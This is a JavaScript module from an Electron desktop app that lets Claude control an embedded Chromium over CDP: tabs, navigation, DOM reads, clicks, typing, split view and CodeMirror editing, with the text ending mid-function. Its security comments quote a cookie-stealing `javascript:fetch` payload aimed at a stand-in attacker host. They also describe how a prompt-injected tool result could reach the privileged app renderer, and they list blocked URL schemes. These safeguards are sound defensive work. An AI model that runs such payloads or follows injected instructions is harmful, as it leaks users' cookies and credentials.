'use strict';

/**
 * chrome-controller.js — Drive the user's REAL Chrome via CDP
 * ──────────────────────────────────────────────────────────────
 * Spawns a system Chrome subprocess pointing at a CCM-managed profile,
 * connects via Puppeteer over a pipe (more secure than --remote-debugging-port).
 *
 * Architecture:
 *   - CCM (this process) ──spawns──▶ chrome.exe --remote-debugging-pipe
 *                                     --user-data-dir=<CCM-managed>
 *                                ─puppeteer-core─▶ controls everything
 *
 * Why a dedicated profile (NOT the user's main Chrome):
 *   - User's main Chrome stays unaffected — no conflict, no profile pollution
 *   - Claude's Chrome accumulates its own bookmarks/cookies/extensions
 *   - User logs in ONCE per service in Claude's Chrome (Google OAuth works
 *     because it's REAL Chrome — no embedding restriction)
 *   - Profile path: %APPDATA%\claude-code-desktop\chrome-profile\
 *
 * Why --remote-debugging-pipe over --remote-debugging-port:
 *   - PORT exposes CDP on localhost:N — anything on the box can drive Chrome
 *   - PIPE is stdio between parent and child — only WE can talk to it
 *
 * Exposed to the rest of the app as `global.ccmChrome.*`, mirrored as
 * /op/chrome-* HTTP routes (browser-http-server.js) and MCP tools
 * (bin/browser-mcp.mjs).
 *
 * Lifecycle:
 *   - launch()    — lazy. First chrome_* tool call triggers spawn.
 *   - close()     — graceful shutdown via browser.close()
 *   - status()    — { running, pid, version, defaultTabId }
 *   - on app `will-quit` we kill the subprocess.
 */

const fs   = require('fs');
const path = require('path');
const os   = require('os');
const { app } = require('electron');

// puppeteer-core is required lazily so a missing/stale install doesn't crash
// the main process at boot. We surface a clean error from chrome_launch instead.
let puppeteer = null;
function _puppeteer() {
  if (puppeteer) return puppeteer;
  try {
    puppeteer = require('puppeteer-core');
    return puppeteer;
  } catch (e) {
    throw new Error(
      'puppeteer-core not installed. Run `npm install puppeteer-core` in the ' +
      'CCM root and restart Electron. (' + e.message + ')'
    );
  }
}

// ── Singleton state ────────────────────────────────────────────────────────
let _browser     = null;  // Puppeteer Browser (attached, not spawned)
let _connectedAt = 0;
let _chromePath  = null;  // resolved path to chrome.exe / Chrome.app / chrome

// ── Phase 9 — target tracking ──────────────────────────────────────────────
// Puppeteer exposes Target.targetInfo but DOESN'T give us "last activated"
// timestamps. We track these ourselves on every activation/navigation so the
// MCP can tell two identical-URL tabs apart and confirm which one it's
// currently driving (from real-session feedback: "Two identical tabs in
// chrome_target_list. Both said `Memorify - Lovable` at the same URL.").
const _targetActivations = new Map();  // targetId → unix ms timestamp
let _attachedTargetId    = null;       // the page _activePage() most recently picked

// ── Cross-origin frame sessions ────────────────────────────────────────────
// OOPIFs (Stripe 3DS, reCAPTCHA, embedded auth) live in their own CDP target.
// Top-level page JS can't touch their DOM. We attach a per-target CDPSession
// and cache it here so frame_eval/click/type can address that frame directly.
const _frameSessions = new Map();      // sessionId → puppeteer CDPSession

// CDP endpoint the embedded Chromium exposes (set by main.js's command-line
// switch). We connect here instead of launching a separate Chrome process —
// so the `chrome_*` tools drive the SAME WebContentsView the user sees.
const CDP_ENDPOINT = process.env.CCM_CDP_ENDPOINT || 'http://127.0.0.1:9222';

function profileDir() {
  return path.join(app.getPath('userData'), 'chrome-profile');
}

// ── URL scheme allowlist (anti-prompt-injection / anti-RCE) ───────────────
// A prompt-injected tool result could trick Claude into asking us to navigate
// to `javascript:fetch('http://attacker/?'+document.cookie)` — Puppeteer's
// page.goto('javascript:...') executes the script in the CURRENT page's
// origin, leaking cookies/credentials. Same risk for `data:text/html,<script>`,
// `file://`, `vbscript:`, `ms-msdt:`, `chrome:` (non-allowlisted), etc.
//
// The auth boundary is the bearer token, but the model is allowed to call us
// — so the model itself is the attack surface. Validate scheme on input.
const _SAFE_URL_SCHEMES = new Set(['http:', 'https:', 'about:']);
// Bypass pattern: strings like "javascript: void(0)" with a space, or with
// embedded \t / \n / unicode whitespace, can confuse `new URL()` into returning
// no protocol (unparseable). The previous version then fell into the
// "bare domain" branch and returned the string unchanged. Fix: strip ALL
// whitespace first, then check the dangerous-prefix list BEFORE parsing.
const _DANGEROUS_URL_PREFIXES = [
  'javascript:', 'data:', 'file:', 'vbscript:', 'ms-msdt:',
  'mhtml:', 'view-source:', 'chrome-extension:',
];
function _safeNavUrl(url) {
  if (typeof url !== 'string' || !url.trim()) {
    throw new Error('url required (string, non-empty)');
  }
  const trimmed = url.trim();
  // Allow `about:blank` and `about:srcdoc` literally
  if (trimmed === 'about:blank' || trimmed === 'about:srcdoc') return trimmed;
  // Dangerous-prefix check runs FIRST — strip ALL whitespace (tabs, newlines,
  // unicode spaces) before comparing so `"javascript: void(0)"` and friends
  // can't slip through via the "unparseable URL" branch.
  const sanitized = trimmed.replace(/\s+/g, '').toLowerCase();
  for (const bad of _DANGEROUS_URL_PREFIXES) {
    if (sanitized.startsWith(bad)) {
      throw new Error(`Refusing to navigate: scheme not allowed (${bad}). Allowed: http(s), about:.`);
    }
  }
  // Allow chrome://<allowlisted> — narrowed further by openInternalPage()
  if (sanitized.startsWith('chrome:')) return trimmed;
  let parsed;
  try { parsed = new URL(trimmed); }
  catch (_) {
    // Unparseable AFTER dangerous-prefix check passed: must be bare-domain
    // or relative. Safe to return as-is for page.goto to resolve.
    return trimmed;
  }
  if (!_SAFE_URL_SCHEMES.has(parsed.protocol)) {
    throw new Error(
      `Refusing to navigate: scheme "${parsed.protocol}" not allowed. ` +
      `Allowed: http:, https:, about:. (javascript:, data:, file:, vbscript:, ` +
      `ms-msdt: are blocked to prevent prompt-injected RCE.)`
    );
  }
  return trimmed;
}

// Works across Puppeteer versions — `isConnected()` was a method in v21-,
// `connected` is a property in v22+. Don't trust either to exist.
function _isBrowserAlive() {
  if (!_browser) return false;
  try {
    if (typeof _browser.isConnected === 'function') return _browser.isConnected();
    if (typeof _browser.connected === 'boolean')    return _browser.connected;
    return true; // assume alive if neither API is available
  } catch (_) { return false; }
}

// ── Find system Chrome ─────────────────────────────────────────────────────
// Returns the first executable Chrome path found on this machine, or null.
// Checks the common install locations across Windows / macOS / Linux. We do
// NOT auto-download Chromium — the whole point is to use the user's REAL
// Chrome so cookies/extensions/passwords match.
function findChrome() {
  if (_chromePath) return _chromePath;
  const home = os.homedir();
  const candidates = process.platform === 'win32' ? [
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    path.join(home, 'AppData\\Local\\Google\\Chrome\\Application\\chrome.exe'),
    'C:\\Program Files\\Google\\Chrome Beta\\Application\\chrome.exe',
    'C:\\Program Files\\Google\\Chrome Dev\\Application\\chrome.exe',
    // Microsoft Edge is Chromium too — fallback only if no Chrome
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
  ] : process.platform === 'darwin' ? [
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    '/Applications/Google Chrome Beta.app/Contents/MacOS/Google Chrome Beta',
    '/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge',
  ] : [
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/snap/bin/chromium',
    '/usr/bin/microsoft-edge',
  ];
  for (const c of candidates) {
    try { if (fs.existsSync(c)) { _chromePath = c; return c; } } catch (_) {}
  }
  return null;
}

// ── Attach (no longer spawn — connect to embedded Chromium) ───────────────
// The chrome_* tools now control the SAME WebContentsView the user sees in
// the CCM panel, by connecting via CDP to Electron's --remote-debugging-port
// (set in main.js before app.whenReady).
//
// Previously this spawned a separate Chrome subprocess. That caused two
// browsers to compete + ate Chrome's anti-bot fingerprint anyway. The new
// design: one browser, two control surfaces (in-process IPC + external CDP).
async function launch(opts = {}) {
  if (_isBrowserAlive()) {
    return { ok: true, alreadyRunning: true, ...(await status()) };
  }
  const pup = _puppeteer();
  try {
    _browser = await pup.connect({
      browserURL:       CDP_ENDPOINT,
      defaultViewport:  null,
      // Newer puppeteer (>= 22) deprecated the old "Page domain" — use the
      // protocol target style which works for Electron-hosted Chromium.
      protocolTimeout:  30_000,
    });
  } catch (e) {
    throw new Error(
      `Could not connect to embedded Chromium at ${CDP_ENDPOINT}. ` +
      `This usually means Electron didn't start with --remote-debugging-port ` +
      `(it should — set in main.js). Original error: ${e.message}`
    );
  }
  _connectedAt = Date.now();
  _browser.on('disconnected', () => {
    console.log('[chrome-controller] CDP disconnected — will reconnect on next call');
    _browser = null;
  });
  return { ok: true, ...(await status()) };
}

async function close() {
  // We don't "close" — that would kill the user's main app. Just detach
  // the CDP session so the next call reconnects fresh.
  if (!_browser) return { ok: true, alreadyDetached: true };
  try { await _browser.disconnect(); } catch (_) {}
  _browser = null;
  return { ok: true, detached: true };
}

async function status() {
  if (!_isBrowserAlive()) {
    return { running: false, endpoint: CDP_ENDPOINT, profileDir: profileDir() };
  }
  let version = null;
  try { version = await _browser.version(); } catch (_) {}
  const pages = await _browser.pages();
  // Surface split-view info inline — saves a second tool call when Claude is
  // checking the layout before driving panes.
  let splitView = null;
  try {
    const sv = await splitState();
    splitView = sv.active ? sv : null;
  } catch (_) { /* ignore */ }
  return {
    running:      true,
    mode:         'attached',
    endpoint:     CDP_ENDPOINT,
    version,
    profileDir:   profileDir(),
    connectedAt:  _connectedAt,
    pageCount:    pages.length,
    pages:        await Promise.all(pages.map(async p => ({
      url:   p.url(),
      title: await p.title().catch(() => ''),
    }))),
    splitView,
  };
}

async function _ensureBrowser() {
  if (!_isBrowserAlive()) {
    await launch();
  }
  return _browser;
}

// When connected to Electron, browser.pages() lists EVERY web context —
// the CCM main window (file://app.asar/index.html or http://localhost:5182),
// every WebContentsView (browser panels), DevTools, etc. We need to find
// the user's BROWSER panel view — not the app UI itself.
//
// Heuristic: a "browseable" page is one whose URL is http(s) or about:blank
// and NOT pointing at our app's own assets / dev server / file://.
function _isBrowserableUrl(url) {
  if (!url) return false;
  if (url === 'about:blank' || url === 'about:srcdoc') return true;
  if (url.startsWith('chrome://') || url.startsWith('chrome-error://') ||
      url.startsWith('devtools://') || url.startsWith('chrome-extension://')) return false;
  if (url.startsWith('file://')) return false; // app assets
  // Vite dev server ports (CCM uses 5182-5190)
  if (/^https?:\/\/localhost:51\d\d(\/|$)/.test(url)) return false;
  if (/^https?:\/\/127\.0\.0\.1:51\d\d(\/|$)/.test(url)) return false;
  return url.startsWith('http://') || url.startsWith('https://');
}

// Most operations target the "active" browser-panel page — NOT the CCM app
// UI itself. We filter the page list to URLs that look like the user is
// browsing, then prefer the most-recently-activated tab (tracked in
// _targetActivations), falling back to the last entry in the page list.
async function _activePage() {
  const browser = await _ensureBrowser();
  const pages = await browser.pages();
  const browseable = [];
  for (const p of pages) {
    try { if (_isBrowserableUrl(p.url())) browseable.push(p); } catch (_) {}
  }
  if (!browseable.length) {
    throw new Error(
      'No browser-panel tab is open. Open the Browser panel in CCM ' +
      '(right-click dock → Add panel → Browser) and load a page first.'
    );
  }
  // Phase 9 — prefer the most-recently-activated browseable tab. Disambiguates
  // when two tabs share a URL/title (the "Memorify - Lovable" twin-tab trap).
  let best = browseable[browseable.length - 1]; // fallback: last in list
  let bestTs = -1;
  for (const p of browseable) {
    const ts = _targetActivations.get(p.target()._targetId);
    if (typeof ts === 'number' && ts > bestTs) {
      bestTs = ts;
      best = p;
    }
  }
  _attachedTargetId = best.target()._targetId;
  return best;
}

// SECURITY — only return pages whose URL passes the browseable filter. This
// blocks an MCP caller from targeting the CCM main renderer (which has
// `electronAPI` preload access) via { targetId: ... } + chrome_runtime_eval.
// Without this filter, a prompt-injected tool result could enumerate targets
// via chrome_cdp_raw{Target.getTargets}, pick the CCM UI's targetId, then run
// arbitrary JS in privileged renderer context — full IPC abuse follows.
async function _pageById(targetId) {
  if (typeof targetId !== 'string' || !targetId.trim()) return null;
  const browser = await _ensureBrowser();
  const pages = await browser.pages();
  const match = pages.find(p => p.target()._targetId === targetId);
  if (!match) return null;
  if (!_isBrowserableUrl(match.url())) {
    throw new Error(
      'Refused: targetId ' + targetId + ' points at a non-browseable page ' +
      '(CCM app UI, DevTools, or chrome-extension://). Only browser-panel tabs ' +
      'are addressable via MCP tools.'
    );
  }
  return match;
}

// ── Target / tab operations ────────────────────────────────────────────────

// Shared URL-match resolver used by targetList() and splitState(). Returns
// { leftTargetId, rightTargetId } given a page list and the renderer's split
// state. Multiple same-URL tabs: first-match-wins per pane, and a tab claimed
// by `left` is excluded from `right` so identical-URL twin tabs don't collide.
// Was previously inlined twice with subtly different "claimed" tracking —
// extraction collapses the duplication into one source of truth.
function _resolvePanesByUrl(pages, split) {
  if (!split || !split.active) return { leftTargetId: null, rightTargetId: null };
  let leftTargetId = null;
  let rightTargetId = null;
  for (const p of pages) {
    if (leftTargetId && rightTargetId) break;
    const url = p.url();
    if (!_isBrowserableUrl(url)) continue;
    const tid = p.target()._targetId;
    if (split.leftUrl && url === split.leftUrl && !leftTargetId) {
      leftTargetId = tid;
    } else if (split.rightUrl && url === split.rightUrl && !rightTargetId && tid !== leftTargetId) {
      rightTargetId = tid;
    }
  }
  return { leftTargetId, rightTargetId };
}

// targetList returns ONLY browser-panel tabs, filtered to exclude the CCM
// app UI and other Electron internals. Each tab includes:
//   - lastActivated: unix-ms timestamp of our last bringToFront/navigate
//                    (null if never touched this session)
//   - attached: true if this is the tab _activePage() last picked (= the tab
//               every chrome_* tool is currently driving). Disambiguates
//               identical-URL twin tabs.
//   - pane: 'left' / 'right' / null — Phase 15 split-view position
//   - pid + viewId — Phase 17 per-tab OS introspection
async function targetList() {
  const browser = await _ensureBrowser();
  const pages   = await browser.pages();
  const split   = global.ccmSplitState;
  const { leftTargetId, rightTargetId } = _resolvePanesByUrl(pages, split);
  // Phase 17 — view→PID map from main process for memory/CPU introspection.
  const viewPids = (typeof global.ccmBrowserViewPids === 'function')
    ? global.ccmBrowserViewPids() : [];
  const claimedViewIds = new Set();

  const out = [];
  for (const p of pages) {
    const url = p.url();
    if (!_isBrowserableUrl(url)) continue;
    const id = p.target()._targetId;
    const pane = id === leftTargetId  ? 'left'
              : id === rightTargetId ? 'right'
              : null;
    const vp = viewPids.find(v => v.url === url && !claimedViewIds.has(v.viewId));
    if (vp) claimedViewIds.add(vp.viewId);
    out.push({
      id,
      url,
      title:         await p.title().catch(() => ''),
      type:          p.target().type(),
      lastActivated: _targetActivations.get(id) || null,
      attached:      id === _attachedTargetId,
      pane,
      pid:           vp?.pid    ?? null,
      viewId:        vp?.viewId ?? null,
    });
  }
  // Sort: attached first, then most-recently-activated, then everything else
  out.sort((a, b) => {
    if (a.attached !== b.attached) return a.attached ? -1 : 1;
    return (b.lastActivated || 0) - (a.lastActivated || 0);
  });
  return {
    tabs:        out,
    count:       out.length,
    attachedId:  _attachedTargetId,
    splitActive: !!(split && split.active),
    splitLeftId:  leftTargetId,
    splitRightId: rightTargetId,
  };
}

// ── Split-view state (Phase 15) ────────────────────────────────────────────
// Lets the MCP caller (Claude) drive both panes of CCM's split-view browser
// in the same turn. Renderer mirrors its state to global.ccmSplitState via
// IPC; we resolve the renderer's viewIds/URLs to CDP targetIds so callers
// can pass `targetId:` to observe / step / click_ref / type_ref / etc.
//
// Returns shape:
//   { active: false }                                            (no split)
//   { active: true, ratio, left: {viewId,url,title,targetId},   (split on)
//                          right: {viewId,url,title,targetId} }
//
// Use case — "research in one pane, notes in the other":
//   1. chrome_split_state                                → { left:{targetId:A}, right:{targetId:B} }
//   2. chrome_observe { targetId: A }                    → read research page
//   3. chrome_step { targetId: B, action:'type', target:'note input', value:'finding: ...' }
//   4. chrome_step { targetId: A, action:'click', target:'next page' }
// Both panes driven from one Claude turn. No active-tab flipping required.
// Phase 16 — Claude-controllable split-view. Each of these calls into
// global.ccmBrowserSplit (installed by main.js) which webContents.sends a
// command to the renderer; the renderer mutates _browser state and replies
// via the reqId pattern. After the round-trip we resolve splitState() so
// the caller gets the full CDP-target-bearing layout back in one response.
function _assertSplitBridge() {
  if (!global.ccmBrowserSplit) {
    throw new Error(
      'split-view bridge not initialized — Electron main process is still booting, ' +
      'or CCM was launched without the Browser panel infrastructure. Retry shortly.'
    );
  }
}

async function splitEnable({ leftUrl, rightUrl, ratio } = {}) {
  _assertSplitBridge();
  // Validate URLs through the same allowlist as direct navigation so a
  // prompt-injected `javascript:` URL can't sneak in via the new tool.
  if (leftUrl)  leftUrl  = _safeNavUrl(leftUrl);
  if (rightUrl) rightUrl = _safeNavUrl(rightUrl);
  if (ratio !== undefined && (typeof ratio !== 'number' || ratio < 0.15 || ratio > 0.85)) {
    throw new Error('ratio must be a number between 0.15 and 0.85');
  }
  const r = await global.ccmBrowserSplit.enable({ leftUrl, rightUrl, ratio });
  if (!r?.ok) {
    return { ok: false, error: r?.error || 'split enable failed' };
  }
  // Give the renderer a beat to push its new state up via setSplitState
  // (refreshChrome → _syncBrowserSplitState fires synchronously, but the IPC
  // round-trip needs one event-loop turn to settle).
  await new Promise(res => setTimeout(res, 80));
  const state = await splitState();
  return { ok: true, ...state, applied: r };
}

async function splitDisable() {
  _assertSplitBridge();
  const r = await global.ccmBrowserSplit.disable();
  if (!r?.ok) return { ok: false, error: r?.error || 'split disable failed' };
  await new Promise(res => setTimeout(res, 50));
  return { ok: true, active: false };
}

async function splitSwap() {
  _assertSplitBridge();
  const r = await global.ccmBrowserSplit.swap();
  if (!r?.ok) return { ok: false, error: r?.error || 'split swap failed' };
  await new Promise(res => setTimeout(res, 80));
  const state = await splitState();
  return { ok: true, ...state, applied: r };
}

async function splitSetRatio({ ratio } = {}) {
  _assertSplitBridge();
  if (typeof ratio !== 'number' || ratio < 0.15 || ratio > 0.85) {
    throw new Error('ratio (number 0.15 to 0.85) required');
  }
  const r = await global.ccmBrowserSplit.setRatio(ratio);
  if (!r?.ok) return { ok: false, error: r?.error || 'split set-ratio failed' };
  await new Promise(res => setTimeout(res, 50));
  const state = await splitState();
  return { ok: true, ratio: state.ratio, ...state };
}

async function splitState() {
  const s = global.ccmSplitState;
  if (!s || !s.active) return { active: false };
  const browser = await _ensureBrowser();
  const pages = await browser.pages();
  // Same URL-match resolver as targetList — single source of truth so the
  // two functions can't disagree about which CDP target each pane is.
  const { leftTargetId, rightTargetId } = _resolvePanesByUrl(pages, s);
  return {
    active: true,
    ratio: typeof s.ratio === 'number' ? s.ratio : 0.5,
    left: {
      viewId:   s.leftViewId  ?? null,
      url:      s.leftUrl     ?? null,
      title:    s.leftTitle   ?? null,
      targetId: leftTargetId,
    },
    right: {
      viewId:   s.rightViewId ?? null,
      url:      s.rightUrl    ?? null,
      title:    s.rightTitle  ?? null,
      targetId: rightTargetId,
    },
  };
}

async function targetNewTab({ url } = {}) {
  // When attached to Electron we can't "open a new tab" the way real Chrome
  // does — Electron's dockview owns tab lifecycle. Best we can do is
  // navigate the active panel to the given URL, OR ask the renderer (via a
  // future bridge) to create a new browser-panel tab. For now we navigate.
  if (!url) throw new Error('url required (cannot create new tabs from CDP in attached mode — open one in CCM\'s Browser panel first)');
  url = _safeNavUrl(url);
  const page = await _activePage();
  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
  const id = page.target()._targetId;
  _targetActivations.set(id, Date.now());
  return {
    ok:    true,
    id,
    url:   page.url(),
    title: await page.title().catch(() => ''),
    note:  'Navigated active browser-panel tab. Use the CCM panel UI to open NEW tabs.',
  };
}

async function targetCloseTab({ id } = {}) {
  const page = id ? await _pageById(id) : await _activePage();
  if (!page) return { ok: false, error: 'Tab not found' };
  const targetId = page.target()._targetId;
  await page.close();
  _targetActivations.delete(targetId);
  if (_attachedTargetId === targetId) _attachedTargetId = null;
  return { ok: true };
}

async function targetActivateTab({ id } = {}) {
  const page = id ? await _pageById(id) : null;
  if (!page) return { ok: false, error: 'Tab not found' };
  await page.bringToFront();
  _targetActivations.set(id, Date.now());
  _attachedTargetId = id;
  return { ok: true, id, url: page.url(), lastActivated: _targetActivations.get(id) };
}

// ── Page operations ────────────────────────────────────────────────────────
async function pageNavigate({ url, waitUntil = 'load', timeout = 30000, stabilize = true, stabilizeMs = 5000, targetId } = {}) {
  url = _safeNavUrl(url);
  const page = await _resolvePage(targetId);
  const resp = await page.goto(url, { waitUntil, timeout });
  _targetActivations.set(page.target()._targetId, Date.now());
  const out = {
    ok:     true,
    url:    page.url(),
    title:  await page.title().catch(() => ''),
    status: resp?.status() || null,
  };
  if (stabilize) {
    try { out.stabilized = await _stabilize({ timeout: stabilizeMs }); } catch (_) {}
  }
  return out;
}

async function pageReload({ waitUntil = 'load', timeout = 30000, targetId } = {}) {
  const page = await _resolvePage(targetId);
  await page.reload({ waitUntil, timeout });
  return { ok: true, url: page.url() };
}

async function pageScreenshot({ fullPage = false, quality = 75, targetId } = {}) {
  const page = await _resolvePage(targetId);
  const buf = await page.screenshot({
    type:     'jpeg',
    quality,
    fullPage: !!fullPage,
    encoding: 'binary',
  });
  return {
    base64:    buf.toString('base64'),
    mediaType: 'image/jpeg',
    url:       page.url(),
    title:     await page.title().catch(() => ''),
  };
}

async function pagePdf({ landscape = false, printBackground = true, targetId } = {}) {
  const page = await _resolvePage(targetId);
  const buf = await page.pdf({ landscape, printBackground });
  return {
    base64:    buf.toString('base64'),
    mediaType: 'application/pdf',
    url:       page.url(),
  };
}

async function pageWaitForLoad({ timeout = 30000, targetId } = {}) {
  const page = await _resolvePage(targetId);
  await page.waitForNavigation({ timeout, waitUntil: 'load' }).catch(() => {});
  return { ok: true, url: page.url() };
}

// ── Runtime — the swiss army knife ─────────────────────────────────────────
async function runtimeEval({ expression, awaitPromise = true, targetId } = {}) {
  if (!expression) throw new Error('expression required');
  const page = await _resolvePage(targetId);
  try {
    const result = await page.evaluate(awaitPromise ? `(async () => (${expression}))()` : expression);
    // result might be undefined / circular — sanitize
    return { ok: true, result };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

// runtimeRun — sibling of runtimeEval for STATEMENT BLOCKS (not expressions).
// Use this when your code has top-level statements ending in `;`, declarations,
// loops, etc. — chrome_runtime_eval wraps in `(async () => (EXPR))()` which
// is expression-only and fails on statements with "Unexpected token ';'".
//
// Wrap pattern: `(async () => { CODE; return ... })()` so you can `await`,
// declare variables, run for-loops, and optionally return a value at the end.
async function runtimeRun({ code, targetId } = {}) {
  if (!code) throw new Error('code (statement block) required');
  const page = await _resolvePage(targetId);
  try {
    const result = await page.evaluate(`(async () => { ${code} })()`);
    return { ok: true, result };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

// ── DOM ────────────────────────────────────────────────────────────────────
async function domQuery({ selector, targetId } = {}) {
  if (!selector) throw new Error('selector required');
  const page = await _resolvePage(targetId);
  const handle = await page.$(selector);
  if (!handle) return { found: false };
  const box = await handle.boundingBox();
  const text = await page.evaluate(el => el.innerText || el.textContent || '', handle);
  return {
    found:    true,
    text:     (text || '').slice(0, 1000),
    rect:     box,
    visible:  !!box && box.width > 0 && box.height > 0,
  };
}

async function domQueryAll({ selector, limit = 50, targetId } = {}) {
  if (!selector) throw new Error('selector required');
  const page = await _resolvePage(targetId);
  return page.evaluate((sel, lim) => {
    return Array.from(document.querySelectorAll(sel)).slice(0, lim).map((el, i) => {
      const r = el.getBoundingClientRect();
      return {
        i,
        tag:  el.tagName.toLowerCase(),
        text: (el.innerText || el.textContent || '').trim().slice(0, 200),
        rect: { x: Math.round(r.left), y: Math.round(r.top), w: Math.round(r.width), h: Math.round(r.height) },
      };
    });
  }, selector, limit);
}

async function domGetText({ selector, targetId } = {}) {
  if (!selector) throw new Error('selector required');
  const page = await _resolvePage(targetId);
  return page.evaluate(sel => {
    const el = document.querySelector(sel);
    return el ? (el.innerText || el.textContent || '') : null;
  }, selector);
}

// ── Input ──────────────────────────────────────────────────────────────────
// Optional auto-stabilize (off by default for legacy compat). Set
// stabilize:true on any call to wait for the page to settle before returning.
async function inputClick({ selector, x, y, stabilize = false, stabilizeMs = 5000, targetId } = {}) {
  const page = await _resolvePage(targetId);
  let result;
  if (selector) {
    await page.click(selector);
    result = { ok: true, clicked: 'selector', target: selector };
  } else if (typeof x === 'number' && typeof y === 'number') {
    await page.mouse.click(x, y);
    result = { ok: true, clicked: 'coords', x, y };
  } else {
    throw new Error('selector or {x,y} required');
  }
  if (stabilize) {
    try { result.stabilized = await _stabilize({ timeout: stabilizeMs }); } catch (_) {}
  }
  return result;
}

async function inputType({ selector, text, delay = 20, stabilize = false, stabilizeMs = 5000, targetId } = {}) {
  if (typeof text !== 'string') throw new Error('text required');
  const page = await _resolvePage(targetId);
  if (selector) await page.focus(selector);
  await page.keyboard.type(text, { delay });
  const result = { ok: true, typed: text.length + ' chars' };
  if (stabilize) {
    try { result.stabilized = await _stabilize({ timeout: stabilizeMs }); } catch (_) {}
  }
  return result;
}

async function inputKey({ key, modifiers = [], stabilize = false, stabilizeMs = 5000, targetId } = {}) {
  if (!key) throw new Error('key required');
  const page = await _resolvePage(targetId);
  for (const m of modifiers) await page.keyboard.down(m);
  await page.keyboard.press(key);
  for (const m of modifiers.slice().reverse()) await page.keyboard.up(m);
  const result = { ok: true };
  if (stabilize) {
    try { result.stabilized = await _stabilize({ timeout: stabilizeMs }); } catch (_) {}
  }
  return result;
}

async function inputScroll({ amount = 600, direction = 'down', targetId } = {}) {
  const page = await _resolvePage(targetId);
  const dy = direction === 'up' ? -amount : amount;
  await page.evaluate(d => window.scrollBy({ top: d, behavior: 'smooth' }), dy);
  return { ok: true };
}

// domClick — selector-based click with auto-scroll-into-view + visible-rect
// clamping. Solves the "click x=1294 hit dead air because target overflowed
// the viewport" issue from the real-session feedback.
//
// Pipeline:
//   1. scrollIntoView({ block: 'center', inline: 'center' }) so the target
//      lands inside the visible viewport
//   2. Wait one frame for layout to settle
//   3. Verify the element's rect is now inside the viewport
//   4. Click at its geometric center (Puppeteer's page.click handles that)
async function domClick({ selector, targetId } = {}) {
  if (!selector) throw new Error('selector required');
  const page = await _resolvePage(targetId);
  // Scroll the target into the visible viewport
  const visible = await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (!el) return { found: false };
    el.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' });
    const r = el.getBoundingClientRect();
    return {
      found:    true,
      rect:     { x: r.left, y: r.top, w: r.width, h: r.height },
      inViewport: r.left >= 0 && r.top >= 0 &&
                  r.right <= window.innerWidth && r.bottom <= window.innerHeight,
      viewport: { w: window.innerWidth, h: window.innerHeight },
    };
  }, selector);
  if (!visible.found) return { ok: false, error: 'selector not found: ' + selector };
  // Give the browser a frame to render the new scroll position
  await new Promise(r => setTimeout(r, 50));
  // Puppeteer's click ALSO scrolls and computes a safe point — belt and suspenders
  try {
    await page.click(selector);
    return { ok: true, selector, rect: visible.rect, inViewport: visible.inViewport };
  } catch (e) {
    return { ok: false, error: e.message, rect: visible.rect };
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// CodeMirror 6 primitives — for live-editing CM-based editors (Lovable.dev,
// CodeSandbox, vscode-web, etc). All four tools below operate on the
// currently-active .cm-content element on the page.
// ═══════════════════════════════════════════════════════════════════════════

// cmFocus — click the CodeMirror editor's visible center and verify focus
// landed on .cm-content (not on a search-result button or toolbar). This is
// the "one primitive, never think about it again" helper from the feedback.
async function cmFocus() {
  const page = await _activePage();
  // Find the editor + its visible center
  const target = await page.evaluate(() => {
    const cm = document.querySelector('.cm-content');
    if (!cm) return { ok: false, error: '.cm-content not found on this page' };
    cm.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' });
    const r = cm.getBoundingClientRect();
    // Clamp to the visible viewport — handles the "editor extends past split"
    // case where geometric center is off-screen.
    const x = Math.max(4, Math.min(window.innerWidth  - 4, r.left + Math.min(r.width  / 2, window.innerWidth  / 2)));
    const y = Math.max(4, Math.min(window.innerHeight - 4, r.top  + Math.min(r.height / 2, window.innerHeight / 2)));
    return { ok: true, x, y };
  });
  if (!target.ok) return target;
  // Click the visible center — Puppeteer's mouse.click handles the actual gesture
  await page.mouse.click(target.x, target.y);
  // Verify focus landed on .cm-content
  await new Promise(r => setTimeout(r, 60));
  const verified = await page.evaluate(() => {
    return document.activeElement?.classList?.contains('cm-content') ||
           document.activeElement?.closest?.('.cm-editor') !== null;
  });
  return { ok: verified, focused: verified, x: target.x, y: target.y };
}

// cmGotoLine — jump to a specific line in the CodeMirror editor.
// CM6's default keymap binds Ctrl+G to "open goto line dialog". We focus,
// fire the chord, type the line number, press Enter. Works on Lovable.dev,
// CodeSandbox, and any vanilla CM6 install.
async function cmGotoLine({ line, targetId } = {}) {
  if (typeof line !== 'number' || line < 1) throw new Error('line (positive integer) required');
  const focusResult = await cmFocus();
  if (!focusResult.ok) return focusResult;
  const page = await _resolvePage(targetId);
  // Open the goto-line dialog (CM6 default: Ctrl+G)
  await page.keyboard.down('Control');
  await page.keyboard.press('KeyG');
  await page.keyboard.up('Control');
  await new Promise(r => setTimeout(r, 150)); // wait for dialog to mount
  // Type the line number + Enter
  await page.keyboard.type(String(line));
  await page.keyboard.press('Enter');
  await new Promise(r => setTimeout(r, 100)); // wait for navigation
  return { ok: true, line };
}

// cmReplaceLine — atomic line replacement. The killer combo:
//   1. Focus editor                       (cmFocus)
//   2. Jump to line N                     (cmGotoLine)
//   3. Home → select to end of line       (Home, Shift+End)
//   4. Replace with new content           (Input.insertText — bypasses CM
//                                          auto-pairing of brackets/quotes)
//   5. Save                               (Ctrl+S, configurable)
// Replaces the 30+ keystroke dance from the real session with one call.
async function cmReplaceLine({ line, content, save = true, targetId } = {}) {
  if (typeof line !== 'number' || line < 1) throw new Error('line (positive integer) required');
  if (typeof content !== 'string') throw new Error('content (replacement string) required');
  const page = await _resolvePage(targetId);
  // 1+2 — focus + goto line
  const goto = await cmGotoLine({ line });
  if (!goto.ok) return goto;
  // 3 — Home then Shift+End to select the whole line
  await page.keyboard.press('Home');
